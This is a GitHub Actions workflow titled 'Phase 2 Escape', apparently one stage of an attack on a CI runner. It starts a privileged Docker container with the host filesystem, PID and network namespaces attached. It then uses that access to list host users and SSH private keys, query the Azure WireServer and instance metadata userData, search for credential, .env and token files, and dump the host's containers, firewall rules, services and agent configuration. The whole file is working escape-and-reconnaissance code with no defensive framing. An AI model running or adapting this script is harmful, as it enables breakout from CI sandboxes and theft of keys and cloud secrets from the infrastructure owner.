name: Phase 2 Escape
on:
  workflow_dispatch:

jobs:
  escape:
    runs-on: ubuntu-latest
    steps:
      - name: Host Escape and Deep Recon
        run: |
          echo "=== PHASE 2: DOCKER ESCAPE TO HOST ==="
          docker run --rm --privileged --pid=host --net=host \
            -v /:/host \
            alpine:latest sh -c '
          echo "=== HOST HOSTNAME ==="
          cat /host/etc/hostname
          echo ""
          echo "=== HOST USERS ==="
          cat /host/etc/passwd | grep -v nologin | grep -v /bin/false
          echo ""
          echo "=== HOST SSH KEYS ==="
          find /host/home -name "authorized_keys" -o -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
          find /host/root/.ssh -type f 2>/dev/null
          echo ""
          echo "=== WIRE SERVER FROM HOST NAMESPACE ==="
          wget -qO- --timeout=5 --header="x-ms-version:2012-11-30" "http://168.63.129.16/machine/?comp=goalstate" 2>&1 || echo "WIRE_FAILED"
          echo ""
          echo "=== WIRE SERVER HEALTH ==="
          wget -qO- --timeout=5 "http://168.63.129.16/?comp=health" 2>&1 || echo "HEALTH_FAILED"
          echo ""
          echo "=== IMDS FROM HOST NAMESPACE ==="
          wget -qO- --timeout=5 --header="Metadata:true" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" 2>&1
          echo ""
          echo "=== HOST DOCKER IMAGES ==="
          chroot /host docker images 2>&1 | head -20
          echo ""
          echo "=== HOST RUNNING CONTAINERS ==="
          chroot /host docker ps -a 2>&1 | head -20
          echo ""
          echo "=== INTERESTING FILES ON HOST ==="
          find /host/etc -name "*.conf" -newer /host/etc/hostname 2>/dev/null | head -20
          find /host/opt -maxdepth 3 -name "*.json" -o -name "*.env" -o -name "*.cfg" 2>/dev/null | head -20
          find /host -name "credentials" -o -name ".env" -o -name "token" 2>/dev/null | grep -v proc | head -20
          echo ""
          echo "=== NETWORK NEIGHBORS (ARP) ==="
          cat /host/proc/net/arp
          echo ""
          echo "=== HOST PROCESSES ==="
          ps auxww | head -40
          echo ""
          echo "=== IPTABLES RULES ==="
          chroot /host iptables -L -n 2>&1 | head -50
          echo ""
          echo "=== SYSTEMD SERVICES ==="
          chroot /host systemctl list-units --type=service --state=running 2>&1 | head -30
          echo ""
          echo "=== WAAGENT CONFIG ==="
          cat /host/etc/waagent.conf 2>/dev/null | grep -v "^#" | grep .
          echo ""
          echo "=== PHASE 2 COMPLETE ==="
          '
